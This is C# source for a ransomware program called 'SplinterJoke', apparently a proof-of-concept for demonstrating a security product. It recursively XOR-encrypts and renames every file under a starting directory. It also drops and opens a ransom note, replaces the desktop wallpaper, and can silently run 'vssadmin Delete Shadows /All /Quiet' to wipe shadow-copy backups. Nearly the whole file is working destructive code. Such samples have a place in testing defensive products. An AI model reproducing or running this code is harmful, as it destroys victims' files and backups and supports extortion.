using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

internal static class SplinterJoke
{
	private static string desktopJpgB64 = "";

	private static string ransomNote = "  \r\nThis is just a SetinelOne PoC Demo\r\n\r\n!!! YOUR FILES ARE ENCRYPTED !!!\r\nAll your files, documents, photos, databases and other important\r\nfiles are encrypted.\r\nYou are not able to decrypt it by yourself! The only method\r\nof recovering files is to purchase an unique private key.\r\nOnly we can give you this key and only we can recover your files.\r\nTo be sure we have the decryptor and it works you can send an\r\nemail SplinterJoke and decrypt one file for free. But this\r\nfile should be of not valuable!\r\nDo you really want to restore your files?\r\n";

	private static int SPI_SETDESKWALLPAPER = 20;

	private static int SPIF_UPDATEINIFILE = 1;

	private static int SPIF_SENDWININICHANGE = 2;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	private static void EncryptFile(string filePath, string password, bool debug)
	{
		try
		{
			byte[] input = File.ReadAllBytes(filePath);
			byte[] bytes = CryptoHelper.EncryptXor(input, password);
			File.WriteAllBytes(filePath, bytes);
			File.Move(filePath, filePath + ".SplinterJoke");
		}
		catch (Exception ex)
		{
			if (debug)
			{
				Console.WriteLine("\nEncryptFile Exception in " + filePath + "\nException:\n" + ex.ToString());
			}
		}
	}

	private static void EncryptFiles(string startingDirectory, string encryptionPassword, bool debug)
	{
		string[] array = new string[0];
		try
		{
			array = Directory.GetFiles(startingDirectory);
		}
		catch (Exception ex)
		{
			if (debug)
			{
				Console.WriteLine("\nDirectory.GetFiles(directory) Exception in " + startingDirectory + "\nException:\n" + ex.ToString());
			}
			return;
		}
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				if (text != null)
				{
					EncryptFile(text, encryptionPassword, debug);
				}
			}
			catch (Exception ex2)
			{
				if (debug)
				{
					Console.WriteLine("\nEncryptFiles Exception in " + text + "\nException:\n" + ex2.ToString());
				}
			}
		}
		string[] array3 = new string[0];
		try
		{
			array3 = Directory.GetDirectories(startingDirectory);
		}
		catch (Exception ex3)
		{
			if (debug)
			{
				Console.WriteLine("\nDirectory.GetDirectories(directory) Exception in " + startingDirectory + "\nException:\n" + ex3.ToString());
			}
			return;
		}
		string[] array4 = array3;
		foreach (string startingDirectory2 in array4)
		{
			EncryptFiles(startingDirectory2, encryptionPassword, debug);
		}
	}

	private static void ChangeDesktop()
	{
		string text = Path.Combine(Path.GetTempPath(), "desktop.jpg");
		File.WriteAllBytes(text, Convert.FromBase64String(desktopJpgB64));
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey.SetValue("WallpaperStyle", 1.ToString());
		registryKey.SetValue("TileWallpaper", 0.ToString());
		SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, text, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
	}

	private static void WriteRansomNote()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string text = Path.Combine(folderPath, "ransom_note.txt");
		File.WriteAllText(text, ransomNote);
		Process.Start("notepad.exe", text);
	}

	private static void DeleteShadowCopies()
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "vssadmin.exe";
		processStartInfo.Arguments = " Delete Shadows /All /Quiet";
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static string RunSplinterJoke(string startingDirectory, string encryptionPassword, bool deleteShadowCopies, bool debug)
	{
		string result = "";
		EncryptFiles(startingDirectory, encryptionPassword, debug);
		ChangeDesktop();
		WriteRansomNote();
		if (deleteShadowCopies)
		{
			DeleteShadowCopies();
		}
		return result;
	}
